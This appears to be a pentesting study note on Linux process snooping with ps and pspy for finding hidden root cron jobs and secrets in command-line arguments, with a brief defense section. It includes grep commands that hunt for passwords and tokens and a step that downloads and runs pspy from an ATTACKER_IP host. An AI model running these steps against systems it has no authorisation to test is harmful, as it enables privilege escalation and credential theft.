---
title: "Process Snooping"
created: 2026-11-01
updated: 2026-11-16
type: technique
tags: [technique, privesc, linux, enumeration]
---

Observing running processes to discover hidden cron jobs, background scripts, and secrets passed as command-line arguments. Any user can see every process's full command line — even root processes.

---

## Why It Matters

Automated enumeration tools take a snapshot — they show what's configured *right now*. But short-lived processes (cron jobs, backup scripts, periodic tasks) start and exit in milliseconds. If you only check `/etc/crontab` and `/etc/cron.d/`, you miss anything launched by root's personal crontab, systemd timers, or wrapper scripts in `/root/`.

Process snooping fills that gap by watching what actually executes over time.

---

## Polling Approach

The simplest method — repeatedly run `ps` and look for interesting processes:

```bash
ps aux
ps aux | grep -i pass
ps aux | grep -i key
ps aux | grep -i token
watch -n 1 'ps aux'
```

**Limitation:** polling has gaps. A process that starts and exits between your checks is invisible. The faster it runs, the more likely you miss it.

---

## Event-Driven Approach: pspy

pspy solves the polling problem. Instead of repeatedly scanning, it sets **inotify watches** on commonly accessed directories (`/etc`, `/tmp`, `/usr`, `/var`). When filesystem activity is detected, it immediately scans `/proc` to catch the new process before it exits.

This works because process metadata in `/proc` is briefly visible to all users during a process's lifetime — pspy doesn't bypass any permissions, it just reacts fast enough.

```bash
./pspy64
```

Output shows UID, PID, timestamp, and full command for every process that spawns:

```
2026/11/16 01:06:11 CMD: UID=0  PID=1682 | /bin/bash /root/run-backup.sh
2026/11/16 01:06:11 CMD: UID=0  PID=1684 | tar -czf /var/backup/syslog.tar.gz /var/log/syslog
```

### What to Look For

- **UID=0 processes** calling scripts outside `/root/` — if the script is world-writable, that's a direct privesc
- **Credentials in arguments** — database passwords, API keys, tokens visible in the command line
- **Patterns** — processes that repeat on a schedule reveal hidden cron jobs or loops
- **Scripts calling other scripts** — the parent may be locked down but the child might be writable

### Getting pspy on Target

```bash
# On attacker: serve the binary
python3 -m http.server 8000

# On target: download and run
wget http://ATTACKER_IP:8000/pspy64
chmod +x pspy64
./pspy64
```

Available in 32-bit (`pspy32`) and 64-bit (`pspy64`) variants.

---

## Defense

- Never pass secrets as command-line arguments — they're visible to all users via `/proc`
- Use environment variables, config files with `chmod 600`, or a secrets manager instead
- Set `hidepid=2` on `/proc` mount to restrict process visibility between users

---

## Related Notes

- [[Automated Enumeration Tools]] — LinPEAS, LinEnum, and other scanners
- [[Exploiting Crontab]] — exploiting cron jobs once found
- [[Methodology]] — where process snooping fits in enumeration
